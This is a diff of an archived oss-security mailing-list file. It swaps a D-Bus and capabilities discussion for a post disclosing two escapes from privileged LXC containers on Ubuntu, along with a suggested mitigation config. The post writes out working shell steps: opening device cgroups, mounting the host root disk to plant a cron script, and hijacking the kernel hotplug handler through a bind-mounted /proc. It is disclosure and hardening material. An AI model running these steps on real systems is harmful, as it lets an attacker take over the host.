@@ -1,60 +1,141 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/07/12/5
-Message-ID: <20190712115326.5db9130a@jabberwock.cb.piermont.com>
-Date: Fri, 12 Jul 2019 11:53:26 -0400
-From: "Perry E. Metzger" <perry@...rmont.com>
-To: Jordan Glover <Golden_Miller83@...tonmail.ch>
-Cc: oss-security@...ts.openwall.com, Simon McVittie <smcv@...ian.org>
-Subject: Re: Privileged File Access from Desktop Applications
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/02/12/6
+Message-ID: <CAN_LGv21xFRzej=akWo0rn2PRMydbu-+33h6uqLJ6BkzP-kf3Q@mail.gmail.com>
+Date: Tue, 12 Feb 2019 23:34:43 +0500
+From: "Alexander E. Patrakov" <patrakov@...il.com>
+To: oss-security@...ts.openwall.com
+Cc: lxc-users@...ts.linuxcontainers.org
+Subject: Two more LXC breakouts (both privileged), apparmor issue?
 Content-Type: text/plain; charset=utf-8
 
-On Fri, 12 Jul 2019 14:40:19 +0000 Jordan Glover
-<Golden_Miller83@...tonmail.ch> wrote:
-> > > I think you might be misunderstanding the scope of D-Bus.  
-> >
-> > Not really. The whole point is that instead of having the
-> > operating system alone as part of your file security
-> > implementation you now have a brand new service, an IPC
-> > mechanism, and loads of other stuff, instead of having your app
-> > just do open(2) and write(2) etc.  
-> 
-> Do you mean that IPC and D-bus aren't part of the OS? Then what is?
+Hello,
 
-There's already a file i/o mechanism in the kernel, and it's already
-doing access control. You're building a second one. This is bad.
+there is a container breakout currently discussed (CVE-2019-5736),
+which affected LXC among others. Let me share two more, IMHO easier,
+breakout techniques that work against LXC, at least in Ubuntu 18.10,
+which has LXC 3.0.3. Both techniques work only in privileged
+containers, and so, given that LXC upstream does not treat privileged
+containers as a viable security boundary, I don't think there is
+anything CVE-worthy here, just an opportunity to tighten the defaults,
+unless this is a bug in AppArmor or its policies. Also, please treat
+this whole email as Ubuntu-specific, because of the references to
+AppArmor.
 
-Again, if you need fine grained access grants, there's a mechanism
-for that which has been intensely studied for decades now, which is
-capabilities. Building ad-hoc secondary file i/o handlers isn't going
-to be as secure as a capability system, and is going to yield yet
-more surface area for attackers, not to mention adding complexity
-which makes reasoning about the security of the system harder.
+The primary goal of this email is to post exploits, so that I can
+point people to something better than just nonconstructive words about
+"security implications" when they ask :)
 
-None of this should require saying, but apparently it does.
+The secondary goal is to learn a bit more about AppArmor, i.e. I was
+surprised that the "mount" step works in the first exploit, want to
+know why. I.e. what's the real difference between
+"lxc-container-default" and "lxc-container-default-with-mounting"
+profiles.
 
-> > It seems architecturally bad from a security perspective. The
-> > number the number of trusted entities, the number of moving
-> > parts, the number of mechanisms, and thus the number of ways
-> > things can go wrong keeps going up. This is a mistake. And btw,
-> > this is a major piece of mechanism being added just to handle the
-> > problem of someone wanting to pop open an editor inside a GUI to
-> > edit a system config file, which is not a major attack vector.
-> > But, now I have to worry about this new file access service
-> > providing an attack surface that didn't exist before.
-> >
-> > What's the right way to handle this stuff? Capabilities,
-> > probably. It's what they're designed for.  
-> 
-> They're completely not designed for this case. Setting
-> CAP_DAC_OVERRIDE or CAP_SYS_ADMIN is very close to SUID root. See:
-> https://grsecurity.net/false_boundaries_and_arbitrary_code_execution.php
+When reproducing exploits, it is important that you install openssh in
+the test containers, and work from an ssh connection, not lxc-attach.
+That's because of slightly-different namespace setups, and because
+lxc-attach requires root, so "you already have to be root to break
+out", i.e. the achievement becomes too trivial.
+
+Prior art:
+
+- myself trying to debug why the memory limit does not apply:
+https://github.com/lxc/lxc/issues/2845
+- an existing bug about unintended access to block devices:
+https://github.com/lxc/lxc/issues/2762
+
+Exploit 1: abuse of device cgroups and block devices
+
+Prerequisite: a privileged container created with the "download"
+template, without tweaking any AppArmor settings. E.g.:
+
+sudo lxc-create -t download -n exploit1 -- -d ubuntu -r cosmic -a amd64
+
+Install openssh there, then let a hacker ssh into it and let them sudo
+to root. So now the hacker has root in a privileged container.
+
+By default, the container is covered by the
+"lxc-container-default-cgns" profile. Or at least, that's what
+mentioned in dmesg in denial messages. It specifically allows mounting
+of cgroup and cgroup2 filesystems under /sys/fs/cgroup. And, by
+default, LXC relies on systemd inside the container to mount cgroup
+hierarchies that it needs. There are also other profiles that can be
+used but are not the default:
+
+- lxc-container-default: does not allow mounting cgroup and cgroup2
+- lxc-container-default-with-mounting: does not allow mounting cgroup
+and cgroup2, but supposedly allows ext2/3/4, xfs, and btrfs.
+- lxc-container-default-with-nesting: allows cgroup and cgroup2, also
+allows almost arbitrary bind mounts.
+
+So, to break out, let's exploit the fact that, on Ubuntu, cgroups are
+the only protection against mounting arbitrary block devices in
+containers - but, by default, there is nothing that prevents the
+hacker from lifting the restriction from within a container. So:
+
+# Step 1: find all device cgroups, add permission to use all block devices.
+f=`find /sys/fs/cgroup -name devices.allow`
+for d in $f ; do echo -n 'b *:* rwm' > "$d" ; done # you may need to
+repeat this a few times
+for d in $f ; do echo -n 'b *:* rwm' > "$d" ; done # ok, repeating
+
+# Step 2: find an interesting block device, create a device node and mount it.
+cat /proc/partitions # found /dev/vda1, looks like the host's root fs is there
+mknod /dev/vda1 b 252 1 # based on numbers from /proc/partitions
+mount /dev/vda1 /mnt # I don't know why this succeeds (on ext4), but it does
+
+# Step 3: write some code that will run on the host
+nano /mnt/etc/cron.d/badscript
+
+# Step 4: wait for cron to run it on the host
+
+I was able to mitigate this by not letting the container access any
+cgroups except the bare minimum necessary for systemd to function. Not
+sure if this creates other security problems.
+
+lxc.apparmor.profile = lxc-container-default
+lxc.mount.entry = tmpfs sys/fs/cgroup tmpfs nosuid,nodev,noexec,mode=755
+lxc.mount.entry = cgroup sys/fs/cgroup/systemd cgroup
+nosuid,nodev,noexec,xattr,name=systemd,create=dir
+
+Question: why is this not the default?
+
+Exploit 2: abuse of hotplug handler
+
+Prerequisite: setup for nested privileged containers. E.g. this:
+
+sudo lxc-create -t download -n exploit2 -- -d ubuntu -r cosmic -a amd64
+
+... with this line uncommented in the config:
+
+lxc.include = /usr/share/lxc/config/nesting.conf
+
+(the config does warn about "security implications", but this is not
+enough to convince people, "known root hole" would be a better
+wording).
+
+To break out, let's exploit the fact that the kernel, when told so via
+/proc, will run arbitary programs for us. I mean, in reaction to
+hotplug events - the legacy handler is settable via
+/proc/sys/kernel/hotplug. There are some rules in the apparmor profile
+that prohibit writing there, but apparmor is path-based, and these
+rules would not fire if a copy of /proc is mounted somewhere else
+(which is needed for nesting but is disallowed otherwise). So:
+
+# Step 1: write a script that will run on the host.
+nano /badscript
+chmod +x /badscript
+
+# Step 2: make it a hotplug event handler via a second instance of /proc
+mkdir /proc2
+mount --bind /proc /proc2
+echo /var/lib/lxc/exploit2/rootfs/badscript > /proc2/sys/kernel/hotplug
+# Well, there was some guessing here based on the default container
+path, I hope it's OK
+
+# Step 3: provoke some hotplug event. Actually, several events.
+ip link add dummy0 type dummy
 
 
-Those aren't capabilities. Those are this POSIX mechanism that got
-the same name for no good reason and doesn't do anything like what an
-actual capability system does.
-
-
-Perry
 -- 
-Perry E. Metzger		perry@...rmont.com
+Alexander E. Patrakov
